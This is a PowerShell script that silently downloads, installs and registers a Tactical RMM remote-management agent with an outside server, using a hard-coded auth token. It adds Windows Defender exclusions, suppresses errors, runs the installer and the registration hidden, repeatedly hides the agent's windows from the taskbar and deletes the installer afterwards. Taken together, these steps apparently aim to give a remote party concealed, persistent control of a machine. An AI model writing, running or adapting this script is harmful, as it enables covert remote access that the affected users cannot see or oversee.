[CmdletBinding()]
param()

$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# === CONFIGURATION ===
$api       = "https://api.dylanservers.top"
$clientid  = "1"
$siteid    = "1"
$agenttype = "server"
$auth      = "dd9052c2685252cfd79a37a459bc3e35543e5b92114068ffd85214704167ff76"

$innosetup = "tacticalagent-v2.12.0-windows-amd64.exe"
$downloadlink = "https://github.com/amidaware/rmmagent/releases/download/v2.12.0/tacticalagent-v2.12.0-windows-amd64.exe"
$OutPath = $env:TMP
$outputFile = Join-Path $OutPath $innosetup

# === 1. NETWORK CHECK ===
$serverHost = ([System.Uri]$api).Host
$connectResult = Test-NetConnection -ComputerName $serverHost -Port 443 -ErrorAction SilentlyContinue
if (-not $connectResult.TcpTestSucceeded) { Exit 1 }

# === 2. DOWNLOAD ===
Invoke-WebRequest -Uri $downloadlink -OutFile $outputFile -UseBasicParsing
Unblock-File -Path $outputFile

# === 3. EXCLUSIONS ===
Add-MpPreference -ExclusionPath 'C:\Program Files\TacticalAgent\*'
Add-MpPreference -ExclusionPath 'C:\ProgramData\TacticalRMM\*'

# === 4. LOAD API ===
Add-Type @"
    using System; using System.Runtime.InteropServices;
    public class WinAPI {
        [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", SetLastError=true)]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
"@

# === 5. RUN INSTALLER ===
Start-Process -FilePath $outputFile -ArgumentList "/VERYSILENT /SP- /SUPPRESSMSGBOXES /NORESTART" -WindowStyle Hidden -Wait

# === 6. RUN REGISTRATION ===
Start-Sleep -Seconds 2

$agentPath = "C:\Program Files\TacticalAgent\tacticalrmm.exe"
if (!(Test-Path $agentPath)) {
    $agentPath = "C:\Program Files (x86)\TacticalAgent\tacticalrmm.exe"
}

$installArgs = @('-m', 'install', '--api', $api, '--client-id', $clientid, '--site-id', $siteid, '--agent-type', $agenttype, '--auth', $auth)

Start-Process -FilePath $agentPath -ArgumentList ($installArgs -join " ") -WindowStyle Hidden -Wait

# === 7. TASKBAR CLEANER (Hides all windows belonging to Tactical processes) ===
Write-Host "Cleaning up windows..." -ForegroundColor Gray

# Loop 5 times to catch windows that might delay opening
$delay = 0
while ($delay -lt 5) {
    # Find all processes with "Tactical" in name that have a window handle
    $tacticalProcs = Get-Process | Where-Object { 
        ($_.ProcessName -like "*tactical*") -and (($_.MainWindowHandle -ne [IntPtr]::Zero)) 
    }

    foreach ($proc in $tacticalProcs) {
        # Send SW_HIDE (0) to hide the window from Taskbar completely
        [WinAPI]::ShowWindow($proc.MainWindowHandle, 0) | Out-Null
    }
    Start-Sleep -Milliseconds 200
    $delay++
}

# Cleanup installer
Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue

Write-Host "Done."
Exit 0
